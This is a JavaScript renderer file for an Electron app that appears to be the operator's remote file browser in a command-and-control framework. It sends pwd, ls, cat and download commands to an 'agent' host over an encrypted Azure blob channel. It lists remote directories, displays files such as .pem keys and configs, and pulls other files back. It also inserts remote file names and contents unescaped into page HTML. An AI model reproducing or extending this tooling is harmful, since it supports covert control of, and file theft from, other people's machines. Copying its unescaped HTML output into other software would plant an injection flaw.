const { ipcRenderer } = require("electron");
const crypto = require('crypto');
const az = require('./azure');
const { log } = require('console');
let sortAscending = true;
let containerName = '';
let containerKey;
let containerBlob;
let agentObj;
let agent;
let init_cwd = 0;
let pwd = '';
let mode = '';
let currentFile = '';


function splitStringWithQuotes(str) {
    const result = [];
    let current = '';
    let insideQuotes = false;
    let quoteChar = '';
    for (let i = 0; i < str.length; i++) {
      const char = str[i];
      if (insideQuotes) {
        if (char === '\\' && (str[i + 1] === quoteChar || str[i + 1] === '\\')) {
          // Handle escaped quote or backslash
          current += str[i + 1];
          i++; // Skip the next character
        } else if (char === quoteChar) {
          // End of quoted string
          insideQuotes = false;
          result.push(current);
          current = '';
        } else {
          // Inside quoted string
          current += char;
        }
      } else {
        if (char === '"' || char === "'") {
          // Start of quoted string
          insideQuotes = true;
          quoteChar = char;
        } else if (char === '\\' && str[i + 1] === ' ') {
          // Handle escaped space
          current += ' ';
          i++; // Skip the next character
        } else if (char === ' ') {
          // Space outside of quotes
          if (current.length > 0) {
            result.push(current);
            current = '';
          }
        } else {
          // Unquoted string
          current += char;
        }
      }
    }
    // Add the last argument if there's any
    if (current.length > 0) {
      result.push(current);
    }
    return result;
}
function generateUUID(len) {
    // Generate a random UUID
    if (len > 20){len = 20};
    const uuid = crypto.randomUUID();
    // Remove hyphens and take the first 10 characters
    const shortUUID = uuid.replace(/-/g, '').substring(0, len);
    return shortUUID;
}
function doDownloadFile(argv) 
{
  const downloadFile = "'" + argv[1] +"'";
  const downloadBlob = generateUUID(10);
  const download = {
    'file':downloadFile,
    'blob':downloadBlob
  }
  return download;
}

function sendCommand(command) {
    let argv = splitStringWithQuotes(command);
    log(`argv : ${argv}`);
    log(`explorer.js : sendCommand : ${command}`);
    log(`containerBlob : ${containerBlob}`);
    log(`containerKey  : ${containerKey}`);
    log(`containerName : ${containerName}`);

    let containerCmd = JSON.parse(`{"blobs":${containerBlob}}`);
    containerCmd.key = JSON.parse(containerKey);
    containerCmd.name = containerName;
    containerCmd.cmd = command;
    log(`containerCmd : \r\n${JSON.stringify(containerCmd)}`);

    let download;
    let download_command;

    log(`argv[0] : ${argv[0]}`);
    if (argv[0] == "download")
    {
        log(`hit download`);
        let currentPath = document.getElementById("dirPath").value.trim();
        const concatenated = argv.slice(1).join(" ");
        argv[1] = currentPath.endsWith("/") ? currentPath + concatenated : currentPath + "/" + concatenated;
        log(`argv : ${argv}`);
        download = doDownloadFile(argv);
        log(`[+] SendCommand.explorer.js : JSON.stringify(download) \r\n: ${JSON.stringify(download)}`);
        download_command = `download ${download['file']} ${download['blob']}`;
        log(`[+] SendCommand.explorer.js : command : ${download_command}`);
        containerCmd.cmd = download_command;
        log("pulling download file");
        log(`download['file'] : ${download['file']}`);
        log(`download['blob'] : ${download['blob']}`);
        log(`containerCmd : \r\n${JSON.stringify(containerCmd)}`);
        ipcRenderer.send('pull-download-file', JSON.stringify(containerCmd),download['file'],download['blob']);  // Send command and container name
        log(`[+] SendCommand.explorer.js : JSON.stringify(containerCmd) \r\n: ${JSON.stringify(containerCmd)}`);
        ipcRenderer.send('upload-client-command-to-input-channel', JSON.stringify(containerCmd));  // Send command and container name
// 
    }
    else{
        log(`hit all else handler`);
        ipcRenderer.send('upload-client-command-to-input-channel', JSON.stringify(containerCmd));  // Send command and container name
    }
}

async function initialize() {
    log(`Initialize explorer.js`);

    mode = "pwd";
    sendCommand("pwd");
    // listFiles();
}

async function listFiles() {
    mode = "list";
    sendCommand(`ls ${"'"+document.getElementById("dirPath").value.trim()+"'"}`);
}

async function listFiles_display(lsCommandOutput) 
{
    // Split output into lines and remove headers
    let lines = lsCommandOutput.split("\n").slice(2); // Skip headers and separator line

    let files = lines.map(line => {
        let parts = line.match(/(.{1,60})\s+(File|Directory)\s+(\d+|-)\s+(\d{2}\/\d{2}\/\d{2} \d{2}:\d{2}:\d{2})\s+(\d{2}\/\d{2}\/\d{2} \d{2}:\d{2}:\d{2})/);

        if (!parts) return null; // Skip invalid lines

        return {
            name: parts[1].trim(),
            type: parts[2] === "Directory" ? "Folder" : "File", // Convert "Directory" to "Folder"
            size: parts[3] === '-' ? '-' : parseInt(parts[3]),
            created: parts[4],
            modified: parts[5]
        };
    }).filter(item => item !== null); // Remove null entries

    // Insert into table
    const fileList = document.getElementById("fileList");
    fileList.innerHTML = "";

    files.forEach(file => {
        const row = document.createElement("tr");
        row.innerHTML = `
            <td class="${file.type === 'Folder' ? 'folder' : 'file'}" 
                onclick="${file.type === 'Folder' ? `navigateTo('${file.name}')` : `openFile('${file.name}')`}">
                ${file.name}
            </td>
            <td>${file.size}</td>
            <td>${file.type}</td>
            <td>${file.modified}</td>
        `;
        fileList.appendChild(row);
    });
}

async function navigateTo(folderName) {
    let currentPath = document.getElementById("dirPath").value.trim();
    
    // Ensure the new path is correctly formatted
    let newPath = currentPath.endsWith("/") ? currentPath + folderName : currentPath + "/" + folderName;

    document.getElementById("dirPath").value = newPath;
    listFiles();
}

async function goBack() {
    let currentPath = document.getElementById("dirPath").value.trim();

    if (currentPath === "/") return; // Prevent navigating beyond root "/"

    // Remove trailing slash if it exists to avoid double counting
    if (currentPath.endsWith("/")) {
        currentPath = currentPath.slice(0, -1);
    }

    // Find the new last occurrence of "/"
    let lastSlashIndex = currentPath.lastIndexOf("/");

    // If there's a parent directory, update the path
    if (lastSlashIndex > 0) {
        let parentPath = currentPath.substring(0, lastSlashIndex + 1); // Keep trailing slash
        document.getElementById("dirPath").value = parentPath;
        listFiles();
    } else {
        document.getElementById("dirPath").value = "/"; // If no more parent, stay at root
        listFiles();
    }
}

async function openFile(filePath) {
    const textExtensions = [".txt", ".json", ".pem", ".log", ".xml", ".md", ".csv", ".ini", ".conf", ".yaml", ".yml",
        ".js",".bak",".html",".css",".cnf"
    ];
    
    // Extract file extension
    log(`openFile : ${filePath}`);
    let fileExt = filePath.substring(filePath.lastIndexOf(".")).toLowerCase();
    
    if (textExtensions.includes(fileExt)) {
        mode = 'cat';
        log(`Reading file: ${filePath}`);
        let currentPath = document.getElementById("dirPath").value.trim();
        let catFilePath = currentPath.endsWith("/") ? currentPath + filePath : currentPath + "/" + filePath;
        catFilePath = "'" + catFilePath + "'";
        currentFile = catFilePath;
        sendCommand(`cat ${catFilePath}`);
    } else {
        log(`Downloading file: ${filePath}`);
        sendCommand(`download ${filePath}`);
    }
}

function sortTable(columnIndex) {
    const table = document.querySelector("tbody");
    const rows = Array.from(table.querySelectorAll("tr"));

    rows.sort((a, b) => {
        let valA = a.children[columnIndex].innerText;
        let valB = b.children[columnIndex].innerText;

        if (!isNaN(valA) && !isNaN(valB)) {
            valA = parseFloat(valA);
            valB = parseFloat(valB);
        }

        return sortAscending ? (valA > valB ? 1 : -1) : (valA < valB ? 1 : -1);
    });

    sortAscending = !sortAscending;
    table.innerHTML = "";
    rows.forEach(row => table.appendChild(row));
}

document.getElementById("dirPath").addEventListener("keypress", function(event) {
    if (event.key === "Enter") {
        listFiles();
    }
});

// document.addEventListener("keydown", function(event) {
//     if (event.key === "Backspace") goBack();
// });


ipcRenderer.on('command-output', (event, output) => {
    try {
        if (output) {
            if(output === "pushedfile" || !output.substring(0, 3).includes('/')){
                const dirPath = document.getElementById('dirPath');
                if (!dirPath.value)
                {
                    initialize();
                    return;
                }else{
                   // listFiles();
                }

            }
            if (mode === "pwd") {
                mode = "";
                if (!output.endsWith("/")) {
                    output += "/";
                }
                //document.getElementById("dirPath").value = output;
                document.getElementById("dirPath").value = "C:/";
                pwd = output;
                listFiles();
            } 
            else if (mode === "list") {
                mode = "";
                listFiles_display(output);
            } 
            else if (mode === "cat") {
                mode = "";
                openTextFileInNewWindow(output);
            }
        }
    } catch (error) {
        log(`Error in explorer.js:command-output: ${error.message}\r\n${error.stack}`);
    }
});

function openTextFileInNewWindow(content) {
    // Count number of lines in the content
    const lineCount = content.split("\n").length;
    const lineHeight = 18; // Approximate height per line in pixels (adjust if needed)
    const minHeight = 200; // Minimum window height
    const maxHeight = window.screen.height - 100; // Prevent window from being too large
    let calculatedHeight = Math.min(Math.max(lineCount * lineHeight + 200, minHeight), maxHeight);

    // Open new window with adjusted height
    const textWindow = window.open("", "TextViewer", `width=1000,height=${calculatedHeight}`);

    if (currentFile.startsWith("'") && currentFile.endsWith("'")) {
        currentFile = currentFile.slice(1, -1);
    }

    textWindow.document.write(`
        <html>
        <head>
            <title>${currentFile}</title>
            <style>
                body { 
                    font-family: monospace; 
                    white-space: pre-wrap; 
                    margin: 0; 
                    padding: 0; 
                    background: #111; 
                    color: #f8f9f8; 
                    overflow: hidden; 
                }
                .container {
                    display: flex;
                    flex-direction: column;
                    height: 100vh;
                }
                .header {
                    padding: 2px;
                    background: #222;
                    color: #fff;
                    text-align: center;
                    font-size: 18px;
                    border-bottom: 1px solid #333;
                }
                .content {
                    flex: 1;
                    padding: 2px;
                    overflow: auto;
                }
                textarea { 
                    width: 100%; 
                    height: 100%; 
                    background: #222; 
                    color: #fff; 
                    border: none; 
                    padding: 2px; 
                    font-size: 14px; 
                    resize: none; 
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="content">
                    <textarea readonly>${content}</textarea>
                </div>
            </div>
        </body>
        </html>
    `);
}

window.addEventListener('DOMContentLoaded', async () => 
    {
      ipcRenderer.on('container-data', (event, name, aes, blobs, agentJson) => 
      {
        log(`explorer.js : container-data : ${name}`);
        try{
          containerName = name;
          containerKey = JSON.stringify(aes);
          containerBlob = JSON.stringify(blobs);
          agent = JSON.parse(agentJson);
          agentObj = agent;
     
          document.title = `${agent.agentid.toUpperCase()} | ${agent.hostname.toUpperCase()} | ${agent.username.toUpperCase()} | ${agent.IP}`;
    
          const dirPath = document.getElementById('dirPath');
          dirPath.focus();
          dirPath.selectionStart = dirPath.selectionEnd = dirPath.value.length; // Ensure cursor is at the end of input
        }catch(error)
        {
          log(error);
        }
    });
    const checkVariables = setInterval(() => {
        if (containerName && containerKey && containerBlob && agentObj && agent) {
            clearInterval(checkVariables); // Stop the loop when all variables have values
            log("All variables have been assigned!");
            initialize();
        }
    }, 100); // Check every 100ms
    }
);

document.addEventListener("keydown", function(event) {
    const dirPath = document.getElementById("dirPath");

    if (!dirPath) return; // Ensure element exists

    const isCtrlOrMeta = event.ctrlKey || event.metaKey;
    const isAlt = event.altKey;

    if (isCtrlOrMeta) {
        switch (event.key.toLowerCase()) {
            case "c": // Copy
                event.preventDefault();
                dirPath.select();
                document.execCommand("copy");
                log("Copied to clipboard:", dirPath.value);
                break;

            case "a": // Select all
                event.preventDefault();
                dirPath.select();
                log("Selected all text in dirPath");
                break;

            case "v": // Paste
                event.preventDefault();
                navigator.clipboard.readText().then((clipboardText) => {
                    dirPath.value = clipboardText;
                    log("Pasted:", clipboardText);
                }).catch(err => console.error("Failed to read clipboard:", err));
                break;

            case "x": // Cut
                event.preventDefault();
                dirPath.select();
                document.execCommand("cut");
                log("Cut text from dirPath");
                break;

            case "arrowleft": // Move cursor back one word
                event.preventDefault();
                moveCursorByWord(dirPath, "left");
                log("Moved cursor back one word");
                break;

            case "arrowright": // Move cursor forward one word
                event.preventDefault();
                moveCursorByWord(dirPath, "right");
                log("Moved cursor forward one word");
                break;
        }
    }
});

// Function to move cursor by one word
function moveCursorByWord(input, direction) {
    let pos = input.selectionStart;
    let value = input.value;

    if (direction === "left") {
        while (pos > 0 && value[pos - 1] === " ") pos--; // Skip spaces
        while (pos > 0 && value[pos - 1] !== " ") pos--; // Move to start of the word
    } else if (direction === "right") {
        while (pos < value.length && value[pos] === " ") pos++; // Skip spaces
        while (pos < value.length && value[pos] !== " ") pos++; // Move to end of the word
    }

    input.selectionStart = input.selectionEnd = pos;
}
